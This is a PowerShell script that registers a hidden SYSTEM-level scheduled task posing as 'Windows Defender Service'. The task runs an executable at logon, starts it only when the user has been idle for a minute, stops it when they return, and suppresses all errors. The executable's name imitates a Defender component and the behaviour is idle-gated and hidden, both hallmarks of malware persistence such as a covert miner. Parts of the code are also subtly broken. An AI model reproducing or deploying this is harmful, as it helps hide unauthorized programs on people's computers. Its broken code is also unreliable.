# Define task details
$TaskName = "Windows Defender Service"
$TaskPath = "C:\Windows\Windows Defender Service.exe"

# Function to start the task on logon
function Start-DefenderTask {
    try {
        $task = New-ScheduledTask -Action (New-ScheduledTaskAction -Execute $TaskPath) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowDemandStart -Hidden)
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -ErrorAction Stop
        # Wait a short time to ensure task is fully registered.
        Start-Sleep -Seconds 2
        return $true #return true if task was registered successfully.
    } catch {
        # Suppress errors
        return $false #return false if task registration failed.
    }
}

# Register the logon task and check if it was successful.
if (Start-DefenderTask) {

    # Function to stop the task if idle (within the same task)
    function Check-IdleState {
        $IdleTimeout = 60 # 60 seconds = 1 minute
        $idleTime = (Get-WmiObject -Class Win32_IdleTime | Select-Object -ExpandProperty IdleTime) / 1000

        if ($idleTime -gt $IdleTimeout) {
            if (-not (Get-Process -Name "Windows Defender Service" -ErrorAction SilentlyContinue)) {
                try{
                    Start-Process -FilePath $TaskPath -ErrorAction Stop
                }
                catch{
                    #suppress errors
                }
            }
        } else {
            if (Get-Process -Name "Windows Defender Service" -ErrorAction SilentlyContinue) {
                try{
                    Stop-Process -Name "Windows Defender Service" -ErrorAction SilentlyContinue
                }
                catch{
                    #suppress errors
                }
            }
        }
    }

    #Add idle checking to the existing task.
    try{
        $task = Get-ScheduledTask -TaskName $TaskName
        $action = $task.Actions
        $IdleAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command {& {Check-IdleState}}"
        $task.Actions += $IdleAction
        $task.Settings.ExecutionTimeLimit = [System.TimeSpan]::Zero #Allow task to run indefinitely
        Set-ScheduledTask -InputObject $task -ErrorAction Stop
    }
    catch{
        #Suppress errors
    }

    #add event triggers to the task
    try{
        $task = Get-ScheduledTask -TaskName $TaskName
        $IdleTrigger = New-ScheduledTaskTrigger -EventTrigger -Subscription "<QueryList><Query Id='0' Path='System'><Select Path='System'>*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4802)]]</Select></Query></QueryList>"
        $UnlockTrigger = New-ScheduledTaskTrigger -EventTrigger -Subscription "<QueryList><Query Id='0' Path='System'><Select Path='System'>*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and (EventID=4803)]]</Select></Query></QueryList>"
        $task.Triggers += $IdleTrigger, $UnlockTrigger
        Set-ScheduledTask -InputObject $task -ErrorAction Stop
    }
    catch{
        #Suppress Errors
    }
}
